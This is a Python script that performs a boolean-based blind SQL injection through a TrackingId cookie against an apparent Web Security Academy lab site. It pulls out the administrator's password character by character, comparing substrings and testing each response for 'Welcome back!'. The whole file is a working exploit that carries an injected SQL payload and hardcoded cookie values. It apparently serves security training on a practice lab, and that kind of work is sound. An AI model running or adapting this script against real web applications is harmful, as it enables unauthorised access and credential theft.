import requests 
import string 


url = 'https://0a5700770398756d80f5c108004f00b9.web-security-academy.net/' 
passdata = list(string.ascii_letters+string.digits+string.punctuation)


admin_pass = []

for x in range(1,21):
    for c in passdata:
        cookie = {
                'TrackingId' : "9bRlYXojUw2XQdaB' AND (SELECT SUBSTRING(password,{},1) FROM users WHERE username='administrator')='{}".format(x,c),'session':"aMVY5DZKfgHdvY3JVyxxoRRnKCfTuWwy"
            }
        print(cookie)
        resp = requests.get(url,cookies=cookie)
        if 'Welcome back!' in resp.text:
            print('valid char',c)
            admin_pass.append(c)
            break

admin_password = ''.join(admin_pass)
print('The Asministrator Password is : ',admin_password)